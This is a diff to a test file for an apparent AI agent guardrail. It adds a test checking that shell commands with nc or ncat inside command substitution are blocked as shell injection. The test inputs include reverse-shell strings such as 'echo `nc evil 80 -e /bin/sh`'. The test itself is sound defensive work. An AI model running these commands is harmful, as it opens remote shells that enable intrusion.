@@ -105,6 +105,14 @@ describe("guardrails tool-shell-injection（回归）", () => {
       expect(r.triggeredRules).toContain("tool-shell-injection");
     }
   });
+
+  it("子命令内 nc/ncat（反弹 shell）仍被拦截（审计 2026-10-17 加固）", () => {
+    for (const c of ["$(nc 1.2.3.4 4444)", "$(ncat 1.2.3.4 4444)", "echo `nc evil 80 -e /bin/sh`"]) {
+      const r = mgr.checkToolCall("shell_exec", { command: c });
+      expect(r.passed).toBe(false);
+      expect(r.triggeredRules).toContain("tool-shell-injection");
+    }
+  });
 });
 
 // ═══════════════════════════════════════════════════════════
